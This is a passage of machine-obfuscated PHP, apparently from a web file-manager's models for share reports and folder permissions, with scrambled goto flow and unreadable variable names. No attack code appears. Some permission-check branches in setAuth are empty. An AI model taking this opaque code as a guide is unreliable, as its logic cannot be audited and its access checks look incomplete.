”â„’¤ƒ[29]]] = 1; } else { $A±æÁ²ã±ª[] = array($a ”â„’¤ƒ[482] => array($a ”â„’¤ƒ[970], 0), $a ”â„’¤ƒ[484] => array($a ”â„’¤ƒ[970], 0), $a ”â„’¤ƒ[1826] => $a ”â„’¤ƒ[1780]); } if ($fó“‹¬½ÀÕ[$a ”â„’¤ƒ[1776]]) { $A±æÁ²ã±ª[] = array($a ”â„’¤ƒ[479] => $fó“‹¬½ÀÕ[$a ”â„’¤ƒ[1776]], $a ”â„’¤ƒ[1435] => array($a ”â„’¤ƒ[389], "\45{$fó“‹¬½ÀÕ[$a ”â„’¤ƒ[1776]]}\x25"), $a ”â„’¤ƒ[1826] => $a ”â„’¤ƒ[1780]); } goto e²ñÊ²å¨­; dô„®”î’ñ: $a ”â„’¤ƒ =& $_SERVER[Ü˜]; $A±æÁ²ã±ª = array(); if ($fó“‹¬½ÀÕ[$a ”â„’¤ƒ[1529]]) { $A±æÁ²ã±ª[$a ”â„’¤ƒ[1529]] = $fó“‹¬½ÀÕ[$a ”â„’¤ƒ[1529]]; } goto bëâº‰‘ÅŒ; e²ñÊ²å¨­: $bØ¿ÃªÏÁ = $this->_makeOrder()->where($A±æÁ²ã±ª)->selectPage(20); if (empty($bØ¿ÃªÏÁ[$a ”â„’¤ƒ[376]])) { return array(); } $this->_listDataApply($bØ¿ÃªÏÁ[$a ”â„’¤ƒ[376]]); goto d‰Òê¿¦™õ; d‰Òê¿¦™õ: return $bØ¿ÃªÏÁ; goto dƒİ©çƒ™‹; dƒİ©çƒ™‹: } public function listDataApply($dë¥ÅÉå„) { $this->_listDataApply($dë¥ÅÉå„); return $dë¥ÅÉå„; } private function _listDataApply(&$D•°ÖáË¾) { goto A´š‘š¥§ƒ; Cé³ğÒ”¨”: unset($bÉôÜÕ…º³); $D•°ÖáË¾ = array_values($D•°ÖáË¾); goto A¤Ñ´ÉÎ„®; A´š‘š¥§ƒ: $CÄö»¸±ô¤ =& $_SERVER[Ü˜]; $e°ªùë×¹º = array_to_keyvalue($D•°ÖáË¾, $CÄö»¸±ô¤[33], $CÄö»¸±ô¤[1529]); $E¢Â¹¿§Êë = Model($CÄö»¸±ô¤[515])->userListInfo(array_unique($e°ªùë×¹º)); goto CïÄ§–Ğß; CïÄ§–Ğß: $CˆùÁ³ì—½ = array_to_keyvalue($D•°ÖáË¾, $CÄö»¸±ô¤[33], $CÄö»¸±ô¤[404]); $BÊÄš¿ä—ß = Model($CÄö»¸±ô¤[799])->sourceListInfo($CˆùÁ³ì—½, !0); foreach ($D•°ÖáË¾ as $cÌ²ÛÀÔ‘Â => &$bÉôÜÕ…º³) { $e Ä£ÄÇ½Š = $bÉôÜÕ…º³[$CÄö»¸±ô¤[1529]]; $bÉôÜÕ…º³[$CÄö»¸±ô¤[1850]] = $E¢Â¹¿§Êë[$e Ä£ÄÇ½Š] ? $E¢Â¹¿§Êë[$e Ä£ÄÇ½Š] : !1; $AãÁ«ä‹ = $bÉôÜÕ…º³[$CÄö»¸±ô¤[404]]; $bÉôÜÕ…º³[$CÄö»¸±ô¤[95]] = $BÊÄš¿ä—ß[$AãÁ«ä‹] ? $BÊÄš¿ä—ß[$AãÁ«ä‹] : !1; if ($bÉôÜÕ…º³[$CÄö»¸±ô¤[95]][$CÄö»¸±ô¤[432]] == $CÄö»¸±ô¤[97]) { unset($D•°ÖáË¾[$cÌ²ÛÀÔ‘Â]); } if ($bÉôÜÕ…º³[$CÄö»¸±ô¤[95]] != $CÄö»¸±ô¤[201] && !$bÉôÜÕ…º³[$CÄö»¸±ô¤[95]]) { unset($D•°ÖáË¾[$cÌ²ÛÀÔ‘Â]); } } goto Cé³ğÒ”¨”; A¤Ñ´ÉÎ„®: } private function _makeOrder($A‘¹ÃÁâ¡ò = '') { goto b­Ä‘¼ÃßÇ; EÌ“„¥À±¶: $aÒã•çÌÎ = Input::get($Cåöœ‡º¯ò[444], $Cåöœ‡º¯ò[7], $Cåöœ‡º¯ò[425], $eğÓŠ¸¡Ò); $b—Òè™ì¢Â = Input::get($Cåöœ‡º¯ò[445], $Cåöœ‡º¯ò[7], $Cåöœ‡º¯ò[1851], array($Cåöœ‡º¯ò[1775], $Cåöœ‡º¯ò[439])); $b—Òè™ì¢Â = $dŸ©óó‘¨È[$b—Òè™ì¢Â]; goto B›£ºÈ³¾; B›£ºÈ³¾: $A‘¹ÃÁâ¡ò = $A‘¹ÃÁâ¡ò . "{$aÒã•çÌÎ}\x20{$b—Òè™ì¢Â}"; return $this->order($A‘¹ÃÁâ¡ò); goto Bì­¶œ©†÷; b­Ä‘¼ÃßÇ: $Cåöœ‡º¯ò =& $_SERVER[Ü˜]; $eğÓŠ¸¡Ò = array($Cåöœ‡º¯ò[204], $Cåöœ‡º¯ò[485], $Cåöœ‡º¯ò[1839], $Cåöœ‡º¯ò[1840]); $dŸ©óó‘¨È = array($Cåöœ‡º¯ò[437] => $Cåöœ‡º¯ò[438], $Cåöœ‡º¯ò[439] => $Cåöœ‡º¯ò[440]); goto EÌ“„¥À±¶; Bì­¶œ©†÷: } public function reportAdd($FÜäšÖÒ”) { $C¶™†öÓÑ¡ =& $_SERVER[Ü˜]; $Böˆ–ÊéÇŠ = array($C¶™†öÓÑ¡[477] => $FÜäšÖÒ”[$C¶™†öÓÑ¡[477]], $C¶™†öÓÑ¡[1529] => USER_ID); if (Model($C¶™†öÓÑ¡[1847])->where($Böˆ–ÊéÇŠ)->find()) { return !1; } $EŠ¹»Æ¹µ = array($C¶™†öÓÑ¡[477] => $FÜäšÖÒ”[$C¶™†öÓÑ¡[477]], $C¶™†öÓÑ¡[1435] => $FÜäšÖÒ”[$C¶™†öÓÑ¡[1435]], $C¶™†öÓÑ¡[404] => $FÜäšÖÒ”[$C¶™†öÓÑ¡[404]], $C¶™†öÓÑ¡[456] => $FÜäšÖÒ”[$C¶™†öÓÑ¡[456]], $C¶™†öÓÑ¡[1529] => USER_ID, $C¶™†öÓÑ¡[29] => $FÜäšÖÒ”[$C¶™†öÓÑ¡[29]], $C¶™†öÓÑ¡[440] => $FÜäšÖÒ”[$C¶™†öÓÑ¡[440]]); return Model($C¶™†öÓÑ¡[1847])->add($EŠ¹»Æ¹µ); } public function reportList($b†½ÜâÄ) { goto B´´‚í¸íÒ; dä–ß“µÖÃ: $d®ÀšÆ¨Ô» = array($eë‰¼ƒùÎ[437] => $eë‰¼ƒùÎ[438], $eë‰¼ƒùÎ[439] => $eë‰¼ƒùÎ[440]); $eé¥›¼ ƒ‹ = $eë‰¼ƒùÎ[1856] . $d®ÀšÆ¨Ô»[$C¼ó˜Öìß]; $eôì¤öäí„ = Model($eë‰¼ƒùÎ[1847])->where($FáÏ´«‘°)->order($eé¥›¼ ƒ‹)->selectPage(20); goto dñ‘œÊŠ‰‘; dñ‘œÊŠ‰‘: if (empty($eôì¤öäí„[$eë‰¼ƒùÎ[376]])) { return array(); } $E…¿¾‘¼©Ï = array_to_keyvalue_group($eôì¤öäí„[$eë‰¼ƒùÎ[376]], $eë‰¼ƒùÎ[719], $eë‰¼ƒùÎ[477]); if (!empty($E…¿¾‘¼©Ï[0])) { $b†½ÜâÄ = $E…¿¾‘¼©Ï[0]; $FáÏ´«‘° = array($eë‰¼ƒùÎ[477] => array($eë‰¼ƒùÎ[7], $b†½ÜâÄ)); $eßœ©İ‹Â‹ = $this->where($FáÏ´«‘°)->field($eë‰¼ƒùÎ[477])->select(); $eßœ©İ‹Â‹ = array_to_keyvalue($eßœ©İ‹Â‹, $eë‰¼ƒùÎ[33], $eë‰¼ƒùÎ[477]); $cÌç›ÑÎÑ = array_diff($b†½ÜâÄ, $eßœ©İ‹Â‹); if (!empty($cÌç›ÑÎÑ)) { foreach ($eôì¤öäí„[$eë‰¼ƒùÎ[376]] as $e‰’Ş›¯Ò => $fñğŠŒ²ĞÑ) { if (in_array($fñğŠŒ²ĞÑ[$eë‰¼ƒùÎ[477]], $cÌç›ÑÎÑ)) { unset($eôì¤öäí„[$eë‰¼ƒùÎ[376]][$e‰’Ş›¯Ò]); } } } } goto DÎÊÎ×Ó; C®ªíåÍéÈ: if (isset($b†½ÜâÄ[$eë‰¼ƒùÎ[29]]) && in_array($b†½ÜâÄ[$eë‰¼ƒùÎ[29]], array($eë‰¼ƒùÎ[97], $eë‰¼ƒùÎ[1852], $eë‰¼ƒùÎ[1853], $eë‰¼ƒùÎ[1854], $eë‰¼ƒùÎ[1855]))) { $FáÏ´«‘°[$eë‰¼ƒùÎ[29]] = $b†½ÜâÄ[$eë‰¼ƒùÎ[29]]; } if (isset($b†½ÜâÄ[$eë‰¼ƒùÎ[719]]) && in_array($b†½ÜâÄ[$eë‰¼ƒùÎ[719]], array($eë‰¼ƒùÎ[201], $eë‰¼ƒùÎ[97], $eë‰¼ƒùÎ[1852], $eë‰¼ƒùÎ[1853]))) { $FáÏ´«‘°[$eë‰¼ƒùÎ[719]] = $b†½ÜâÄ[$eë‰¼ƒùÎ[719]]; } $C¼ó˜Öìß = Input::get($eë‰¼ƒùÎ[445], $eë‰¼ƒùÎ[7], $eë‰¼ƒùÎ[1851], array($eë‰¼ƒùÎ[1775], $eë‰¼ƒùÎ[439])); goto dä–ß“µÖÃ; B´´‚í¸íÒ: $eë‰¼ƒùÎ =& $_SERVER[Ü˜]; $FáÏ´«‘° = array(); if ($b†½ÜâÄ[$eë‰¼ƒùÎ[730]]) { $EšÏç¨¸ğ“ = $b†½ÜâÄ[$eë‰¼ƒùÎ[485]] ? $b†½ÜâÄ[$eë‰¼ƒùÎ[485]] : strtotime(date($eë‰¼ƒùÎ[1849])); $FáÏ´«‘°[$eë‰¼ƒùÎ[204]] = array($eë‰¼ƒùÎ[340], array($b†½ÜâÄ[$eë‰¼ƒùÎ[730]], $EšÏç¨¸ğ“)); } goto C®ªíåÍéÈ; DÎÊÎ×Ó: $this->_listDataApply($eôì¤öäí„[$eë‰¼ƒùÎ[376]]); return $eôì¤öäí„; goto dõÑÛÖ©ì; dõÑÛÖ©ì: } public function reportStatus($f—»ÊŸ˜) { goto c¢°å›Œ­³; bì©––ÃÈµ: $Bè¡…É’Ú™ = Model($eîŠ»…±Íæ[1847])->where($D·àìÃŠà˜)->save($f¾ñ°£…Å‰); if ($f—»ÊŸ˜[$eîŠ»…±Íæ[719]] == $eîŠ»…±Íæ[1852]) { if ($E©£ğƒÎ”‡[$eîŠ»…±Íæ[456]] != $eîŠ»…±Íæ[201] && $this->shareFileMeta($E©£ğƒÎ”‡[$eîŠ»…±Íæ[456]])) { $this->shareFileMeta($E©£ğƒÎ”‡[$eîŠ»…±Íæ[456]], 0); } $this->remove($E©£ğƒÎ”‡[$eîŠ»…±Íæ[477]]); return !0; } if ($Bè¡…É’Ú™ && $f—»ÊŸ˜[$eîŠ»…±Íæ[719]] == $eîŠ»…±Íæ[1853]) { $Bó¸ã‚œùÒ = $f¾ñ°£…Å‰[$eîŠ»…±Íæ[719]] == $eîŠ»…±Íæ[1853] ? 1 : 0; $this->shareFileMeta($E©£ğƒÎ”‡[$eîŠ»…±Íæ[456]], $Bó¸ã‚œùÒ); $this->removeByFile($E©£ğƒÎ”‡[$eîŠ»…±Íæ[456]]); } goto F¶‰Å…·¯; D®Ñ“Àç“°: if (!$E©£ğƒÎ”‡) { return !1; } $f¾ñ°£…Å‰ = array($eîŠ»…±Íæ[719] => $f—»ÊŸ˜[$eîŠ»…±Íæ[719]]); if ($f—»ÊŸ˜[$eîŠ»…±Íæ[719]] == $eîŠ»…±Íæ[1853] && $E©£ğƒÎ”‡[$eîŠ»…±Íæ[719]] == $eîŠ»…±Íæ[1853]) { $f¾ñ°£…Å‰[$eîŠ»…±Íæ[719]] = 0; } goto bì©––ÃÈµ; c¢°å›Œ­³: $eîŠ»…±Íæ =& $_SERVER[Ü˜]; $D·àìÃŠà˜ = array($eîŠ»…±Íæ[402] => $f—»ÊŸ˜[$eîŠ»…±Íæ[402]]); $E©£ğƒÎ”‡ = Model($eîŠ»…±Íæ[1847])->where($D·àìÃŠà˜)->field($eîŠ»…±Íæ[1857])->find(); goto D®Ñ“Àç“°; F¶‰Å…·¯: return $Bè¡…É’Ú™; goto böëÏç·ŸÃ; böëÏç·ŸÃ: } private function removeByFile($EÆ†™ìñù¦) { goto d‡´óÚÖùí; DÛ†å±ïŠù: $bÏÔ—÷Îñ = array($EÑÕ‚ëÍ²Ë[404] => array($EÑÕ‚ëÍ²Ë[7], $FÖ¢¦šÚëè), $EÑÕ‚ëÍ²Ë[482] => 1); $Eêò”¼†ô… = $this->where($bÏÔ—÷Îñ)->field($EÑÕ‚ëÍ²Ë[477])->select(); if (empty($Eêò”¼†ô…)) { return; } goto CÙÖèÒÜêÊ; CÙÖèÒÜêÊ: $A°Á¹¯ƒ— = array_to_keyvalue($Eêò”¼†ô…, $EÑÕ‚ëÍ²Ë[33], $EÑÕ‚ëÍ²Ë[477]); $this->remove($A°Á¹¯ƒ—); goto EÑë—íé…Ã; d‡´óÚÖùí: $EÑÕ‚ëÍ²Ë =& $_SERVER[Ü˜]; $Eêò”¼†ô… = Model($EÑÕ‚ëÍ²Ë[799])->where(array($EÑÕ‚ëÍ²Ë[456] => $EÆ†™ìñù¦))->field($EÑÕ‚ëÍ²Ë[404])->select(); $FÖ¢¦šÚëè = array_to_keyvalue($Eêò”¼†ô…, $EÑÕ‚ëÍ²Ë[33], $EÑÕ‚ëÍ²Ë[404]); goto DÛ†å±ïŠù; EÑë—íé…Ã: } private function shareFileMeta($DÅ­Ú©±éÌ, $c¢¦×Ããš = null) { $Dí†²íÅÌ =& $_SERVER[Ü˜]; $b÷Ìèù´é½ = array($Dí†²íÅÌ[456] => $DÅ­Ú©±éÌ, $Dí†²íÅÌ[103] => $Dí†²íÅÌ[1858]); if (is_null($c¢¦×Ããš)) { return Model($Dí†²íÅÌ[1859])->where($b÷Ìèù´é½)->find(); } $b÷Ìèù´é½[$Dí†²íÅÌ[381]] = $c¢¦×Ããš; Model($Dí†²íÅÌ[1859])->add($b÷Ìèù´é½, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\x65\x5f\141\x75\x74\x68"; public function getAuth($bÕï‹ÆÃ•†) { goto E³ï­åˆÈ; föŞÑé°ªŒ: array_multisort($dùÆ÷±İê‚, SORT_DESC, $E¬×ãë°½²); return $E¬×ãë°½²; goto f…Ù¿˜ÕÉ½; E³ï­åˆÈ: $EÀ¯‰çÕÛË =& $_SERVER[Ü˜]; $f…®Û˜†ª = $this->sourceAuthSelect($bÕï‹ÆÃ•†); $E¬×ãë°½² = array(); goto EÆ‘ã‹ó; EÆ‘ã‹ó: $dùÆ÷±İê‚ = array(); $eè’îåó‰« = 2 << 25; foreach ($f…®Û˜†ª as $aõ™ŞÃŠÇ®) { goto C§ğ®ŸùÑ; dÚÑ¨©Ä÷Ğ: if ($aõ™ŞÃŠÇ®[$EÀ¯‰çÕÛË[413]] == SourceModel::TYPE_USER && $aõ™ŞÃŠÇ®[$EÀ¯‰çÕÛË[493]] == $EÀ¯‰çÕÛË[201]) { $CçÕ‰µŞ²¯ = 0; } $dùÆ÷±İê‚[] = $dŞìôå¨åÏ[$EÀ¯‰çÕÛË[415]] + $CçÕ‰µŞ²¯; goto bÛ÷™èÚï™; C§ğ®ŸùÑ: $dŞìôå¨åÏ = Model($EÀ¯‰çÕÛË[1860])->listData($aõ™ŞÃŠÇ®[$EÀ¯‰çÕÛË[1788]]); if (!$dŞìôå¨åÏ) { continue; } $E¬×ãë°½²[] = $aõ™ŞÃŠÇ®; goto AÆ„Ûñ¶Ğ; AÆ„Ûñ¶Ğ: $CçÕ‰µŞ²¯ = 0; if ($aõ™ŞÃŠÇ®[$EÀ¯‰çÕÛË[413]] == SourceModel::TYPE_GROUP) { $CçÕ‰µŞ²¯ = $eè’îåó‰« * 2; } if ($aõ™ŞÃŠÇ®[$EÀ¯‰çÕÛË[413]] == SourceModel::TYPE_USER) { $CçÕ‰µŞ²¯ = $eè’îåó‰«; } goto dÚÑ¨©Ä÷Ğ; bÛ÷™èÚï™: } goto föŞÑé°ªŒ; f…Ù¿˜ÕÉ½: } public function sourceAuthSelect($d¾¶Âºô) { goto Aì„µ‚ìô‚; Aì„µ‚ìô‚: $EŸ‡õŠäØï =& $_SERVER[Ü˜]; static $A±“ÃŠ‰ù« = array(); $DµĞ¯ßé®„ = is_array($d¾¶Âºô) ? !1 : !0; goto d…à–Œáïò; d…à–Œáïò: if ($DµĞ¯ßé®„) { $d¾¶Âºô = array($d¾¶Âºô); } $Fİ ×†ÅŒ = array(); foreach ($d¾¶Âºô as $f¨ ò…Óì¤) { if (isset($A±“ÃŠ‰ù«[$f¨ ò…Óì¤])) { $Fİ ×†ÅŒ[$f¨ ò…Óì¤] = $A±“ÃŠ‰ù«[$f¨ ò…Óì¤]; } } goto Fİ…¤ª“Œç; DäÄœâğ: $c›İ·Êá±„ = $this->field($E­µˆæá )->order($EŸ‡õŠäØï[402])->where($dòâºğÜÚ‚)->select(); $F·ì‘Ó¹ƒ‘ = array_to_keyvalue_group($c›İ·Êá±„, $EŸ‡õŠäØï[404]); foreach ($d¾¶Âºô as $f¨ ò…Óì¤) { $A±“ÃŠ‰ù«[$f¨ ò…Óì¤] = $F·ì‘Ó¹ƒ‘[$f¨ ò…Óì¤] ? $F·ì‘Ó¹ƒ‘[$f¨ ò…Óì¤] : array(); } goto DŞƒ²¯Õ™; DŞƒ²¯Õ™: if ($DµĞ¯ßé®„) { return $c›İ·Êá±„; } return $F·ì‘Ó¹ƒ‘; goto BÊ»«Ÿš²Ï; Fİ…¤ª“Œç: if (count($Fİ ×†ÅŒ) == count($d¾¶Âºô)) { return $DµĞ¯ßé®„ ? $Fİ ×†ÅŒ[$d¾¶Âºô[0]] : $Fİ ×†ÅŒ; } $E­µˆæá  = $EŸ‡õŠäØï[1861]; $dòâºğÜÚ‚ = array($EŸ‡õŠäØï[404] => array($EŸ‡õŠäØï[7], $d¾¶Âºô)); goto DäÄœâğ; BÊ»«Ÿš²Ï: } public function setAuth($Bæ—–¹§‘¶, $dÀÒ•ÚÆÂ÷) { goto A’Ş•«›‚Ó; a¬ Ú„É½ß: return !0; goto cöƒ©´Îˆˆ; FÓä‹ö†’†: if ($a¬“Ş¨Åà != $E¿“¿›é×) { $eÏ‘²•ÄëÛ = array($c™ì“µíÑ[1693] => $a¬“Ş¨Åà); $dŞ“¥ë±ù» = Model($c™ì“µíÑ[1774])->field($c™ì“µíÑ[1529])->where($eÏ‘²•ÄëÛ)->select(); $dŞ“¥ë±ù» = array_to_keyvalue($dŞ“¥ë±ù», $c™ì“µíÑ[33], $c™ì“µíÑ[1529]); } $F§òĞæª’‹ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $F¹™¿Å¤ = array(); goto Dí·Æåëù•; c¥¢ŞÅˆ: if ($D›öå³†ƒ„[$c™ì“µíÑ[413]] != SourceModel::TYPE_GROUP) { return !1; } $E¿“¿›é× = 1; $a¬“Ş¨Åà = $D›öå³†ƒ„[$c™ì“µíÑ[493]]; goto FÓä‹ö†’†; Dí·Æåëù•: foreach ($dÀÒ•ÚÆÂ÷ as $b‡ÅÏ¬¹‰) { if (!in_array($b‡ÅÏ¬¹‰[$c™ì“µíÑ[413]], $F§òĞæª’‹)) { show_json(LNG($c™ì“µíÑ[1862]), !1); } if ($a¬“Ş¨Åà != $E¿“¿›é×) { if ($b‡ÅÏ¬¹‰[$c™ì“µíÑ[413]] == SourceModel::TYPE_GROUP) { } if ($b‡ÅÏ¬¹‰[$c™ì“µíÑ[493]] != 0 && !in_array($b‡ÅÏ¬¹‰[$c™ì“µíÑ[493]], $dŞ“¥ë±ù»)) { } } if ($b‡ÅÏ¬¹‰[$c™ì“µíÑ[493]] == 0) { $b‡ÅÏ¬¹‰[$c™ì“µíÑ[413]] = SourceModel::TYPE_USER; } $F¹™¿Å¤[] = array($c™ì“µíÑ[404] => $Bæ—–¹§‘¶, $c™ì“µíÑ[413] => intval($b‡ÅÏ¬¹‰[$c™ì“µíÑ[413]]), $c™ì“µíÑ[493] => intval($b‡ÅÏ¬¹‰[$c™ì“µíÑ[493]]), $c™ì“µíÑ[1788] => intval($b‡ÅÏ¬¹‰[$c™ì“µíÑ[1788]]) ? intval($b‡ÅÏ¬¹‰[$c™ì“µíÑ[1788]]) : 0, $c™ì“µíÑ[1842] => intval($b‡ÅÏ¬¹‰[$c™ì“µíÑ[1842]]) ? intval($b‡ÅÏ¬¹‰[$c™ì“µíÑ[1842]]) : -1); } $this->where(array($c™ì“µíÑ[419] => $Bæ—–¹§‘¶))->delete(); $this->addAll($F¹™¿Å¤); goto a¬ Ú„É½ß; A’Ş•«›‚Ó: $c™ì“µíÑ =& $_SERVER[Ü˜]; $D›öå³†ƒ„ = Model($c™ì“µíÑ[1207])->sourceInfo($Bæ—–¹§‘¶); if (!$D›öå³†ƒ„) { return !1; } goto c¥¢ŞÅˆ; cöƒ©´Îˆˆ: } public function authClear($fø‰ÛĞÉŠ„) { $D§ªóÓ¢«‚ =& $_SERVER[Ü˜]; $E‹ËìøÒ½ô = Model($D§ªóÓ¢«‚[1207])->sourceInfo($fø‰ÛĞÉŠ„); $B°×ÄƒãÊÀ = array($fø‰ÛĞÉŠ„); if ($E‹ËìøÒ½ô[$D§ªóÓ¢«‚[412]] == $D§ªóÓ¢«‚[97]) { $cáÇÃ”àÄ = array($D§ªóÓ¢«‚[562] => array($D§ªóÓ¢«‚[521], $E‹ËìøÒ½ô[$D§ªóÓ¢«‚[496]] . $fø‰ÛĞÉŠ„ . $D§ªóÓ¢«‚[522])); $B°×ÄƒãÊÀ = Model($D§ªóÓ¢«‚[1207])->field($D§ªóÓ¢«‚[419])->where($cáÇÃ”àÄ)->getField($D§ªóÓ¢«‚[404], !0); $B°×ÄƒãÊÀ[] = $fø‰ÛĞÉŠ„; } $this->where(array($D§ªóÓ¢«‚[419] => array($D§ªóÓ¢«‚[420], $B°×ÄƒãÊÀ)))->delete(); return !0; } public function getAllChildren($BÎ­ãĞŞÇö) { goto bƒ´…×´Æ¬; a‘Î·…¨ãÀ: if ($C°¸ß†ŠÑØ[$b˜ÄÙŒ£Å[487]] == $b˜ÄÙŒ£Å[201] && $C°¸ß†ŠÑØ[$b˜ÄÙŒ£Å[493]] != $b¥‹“”µë¬) { $aËĞƒâ©‰ = $this->groupChidldAllRootSource($C°¸ß†ŠÑØ[$b˜ÄÙŒ£Å[493]]); } $bÜ™ïçæŠ‹ = $this->field($b˜ÄÙŒ£Å[404])->group($b˜ÄÙŒ£Å[404])->select(); $bÜ™ïçæŠ‹ = array_to_keyvalue($bÜ™ïçæŠ‹, $b˜ÄÙŒ£Å[33], $b˜ÄÙŒ£Å[404]); goto DŒò£ÚŞ±£; E˜é¨±÷Şô: if ($C°¸ß†ŠÑØ[$b˜ÄÙŒ£Å[413]] != SourceModel::TYPE_GROUP) { return array(); } $b¥‹“”µë¬ = 1; $aËĞƒâ©‰ = array($BÎ­ãĞŞÇö); goto a‘Î·…¨ãÀ; C­÷³Ù˜‡İ: $D°Ï®¸ ä« = Model($b˜ÄÙŒ£Å[799])->field($E™í‡ùŠî)->where($eé¿»Õ®ç¡)->select(); $f˜Ÿ¬‘†É = array($BÎ­ãĞŞÇö); foreach ($D°Ï®¸ ä« as $d­Æ‡œ‘£ø) { foreach ($aËĞƒâ©‰ as $b¹Àºåæç„) { $cÍ‘¨öÄä = $b˜ÄÙŒ£Å[47] . $b¹Àºåæç„ . $b˜ÄÙŒ£Å[47]; $FŸÄç‰‘”³ = $d­Æ‡œ‘£ø[$b˜ÄÙŒ£Å[496]] . $d­Æ‡œ‘£ø[$b˜ÄÙŒ£Å[404]] . $b˜ÄÙŒ£Å[47]; if (strstr($FŸÄç‰‘”³, $cÍ‘¨öÄä)) { $f˜Ÿ¬‘†É[] = $d­Æ‡œ‘£ø[$b˜ÄÙŒ£Å[404]]; break; } } } goto cŒ½¼†èè; bƒ´…×´Æ¬: $b˜ÄÙŒ£Å =& $_SERVER[Ü˜]; $C°¸ß†ŠÑØ = Model($b˜ÄÙŒ£Å[1207])->sourceInfo($BÎ­ãĞŞÇö); if ($C°¸ß†ŠÑØ[$b˜ÄÙŒ£Å[412]] != $b˜ÄÙŒ£Å[97]) { return $this->sourceListAuth(array($BÎ­ãĞŞÇö)); } goto E˜é¨±÷Şô; DŒò£ÚŞ±£: if (!$bÜ™ïçæŠ‹) { return array(); } $E™í‡ùŠî = $b˜ÄÙŒ£Å[1863]; $eé¿»Õ®ç¡ = array($b˜ÄÙŒ£Å[404] => array($b˜ÄÙŒ£Å[7], $bÜ™ïçæŠ‹), $b˜ÄÙŒ£Å[432] => $b˜ÄÙŒ£Å[201]); goto C­÷³Ù˜‡İ; cŒ½¼†èè: return $this->sourceListAuth($f˜Ÿ¬‘†É); goto AˆÑ´ç·›Ë; AˆÑ´ç·›Ë: } private function sourceListAuth($c‡Â…­çš‚) { goto AìÒ‡ä´Ì; AìÒ‡ä´Ì: $aÉ´Í½É˜— =& $_SERVER[Ü˜]; $FÍˆĞæ‘¬ = Model($aÉ´Í½É˜—[1207])->sourceListInfo($c‡Â…­çš‚, !0); $c­‹ì‡Ÿ£ = $this->sourceAuthSelect($c‡Â…­çš‚); goto DàÊ›Œ¤Á; Bª¹ÖÖÌ °: array_multisort($aë„ÀƒöĞ, SORT_ASC, $F ÍÌ§™¯); return $F ÍÌ§™¯; goto D¡¸„¼Ä‡; DàÊ›Œ¤Á: $F ÍÌ§™¯ = array(); $aë„ÀƒöĞ = array(); foreach ($FÍˆĞæ‘¬ as $Añ÷ŸÈ„“ä) { goto C­Âš×ÁÍ; eŒÑ ˜Ó†Ì: $EÕÌÑêÃ™æ = count(explode($aÉ´Í½É˜—[8], trim($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[504]], $aÉ´Í½É˜—[8]))); $aë„ÀƒöĞ[] = $EÕÌÑêÃ™æ + ($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[29]] == $aÉ´Í½É˜—[87] ? 0 : 1000); goto d¢Ó™‹¦óí; B’õÉ¾¿‘: $Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[1864]] = $this->authTargetInfo($f¬Ë¼ñ†´Á); $Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[504]] = rtrim($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[499]], $aÉ´Í½É˜—[8]) . $aÉ´Í½É˜—[8] . ltrim($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[504]], $aÉ´Í½É˜—[8]); $F ÍÌ§™¯[] = $Añ÷ŸÈ„“ä; goto eŒÑ ˜Ó†Ì; a¦‡‰“ÓˆÈ: unset($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[95]]); $f¬Ë¼ñ†´Á = $c­‹ì‡Ÿ£[$Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[404]]]; if (!$f¬Ë¼ñ†´Á) { continue; } goto B’õÉ¾¿‘; C­Âš×ÁÍ: unset($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[443]]); unset($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[441]]); unset($Añ÷ŸÈ„“ä[$aÉ´Í½É˜—[415]]); goto a¦‡‰“ÓˆÈ; d¢Ó™‹¦óí: } goto Bª¹ÖÖÌ °; D¡¸„¼Ä‡: } private function groupChidldAllRootSource($DÆÎ«½‚Ú¬) { $e¥µÌ‹¨İŸ =& $_SERVER[Ü˜]; $BÀ·³òâÕ¤ = Model($e¥µÌ‹¨İŸ[1865])->groupChildrenAll($DÆÎ«½‚Ú¬); $D±áŒë¼Ø = array($e¥µÌ‹¨İŸ[487] => 0, $e¥µÌ‹¨İŸ[493] => array($e¥µÌ‹¨İŸ[7], $BÀ·³òâÕ¤), $e¥µÌ‹¨İŸ[413] => SourceModel::TYPE_GROUP); $DÊ±âÀŞ×¦ = Model($e¥µÌ‹¨İŸ[799])->field($e¥µÌ‹¨İŸ[404])->where($D±áŒë¼Ø)->select(); $DÊ±âÀŞ×¦ = array_to_keyvalue($DÊ±âÀŞ×¦, $e¥µÌ‹¨İŸ[33], $e¥µÌ‹¨İŸ[404]); return $DÊ±âÀŞ×¦; } private function authTargetInfo($bìÈó‹¿¶Š) { goto bŠ³¥’³Û¶; dÃÑÑ½– œ: return $F’¿™Š¶½; goto cÒÜïˆ¥Å‹; C¼ˆÂÍ­íä: $f“õÈ•Æ½‘ = 2 << 25; foreach ($bìÈó‹¿¶Š as $FŒÓ«šíÓƒ) { goto EË‚½ô–¡ˆ; EË‚½ô–¡ˆ: $fœÑØµ‰¾å = Model($dùåáØì±¡[1860])->listData($FŒÓ«šíÓƒ[$dùåáØì±¡[1788]]); if (!$fœÑØµ‰¾å) { continue; } if ($FŒÓ«šíÓƒ[$dùåáØì±¡[413]] == SourceModel::TYPE_USER) { $dÁ Ş¼…½ = Model($dùåáØì±¡[511])->getInfoSimpleOuter($FŒÓ«šíÓƒ[$dùåáØì±¡[493]]); if ($dÁ Ş¼…½[$dùåáØì±¡[1529]] == $dùåáØì±¡[1086]) { continue; } if ($dÁ Ş¼…½[$dùåáØì±¡[1529]] == $dùåáØì±¡[201]) { $dÁ Ş¼…½[$dùåáØì±¡[28]] = LNG($dùåáØì±¡[1866]); } } else { $dÁ Ş¼…½ = Model($dùåáØì±¡[495])->getInfoSimple($FŒÓ«šíÓƒ[$dùåáØì±¡[493]]); } goto EÄ²¾·ƒ•é; B„ã™ËÖÌá: $e¨çßœ‘Ûî = 0; if ($FŒÓ«šíÓƒ[$dùåáØì±¡[413]] == SourceModel::TYPE_GROUP) { $e¨çßœ‘Ûî = $f“õÈ•Æ½‘ 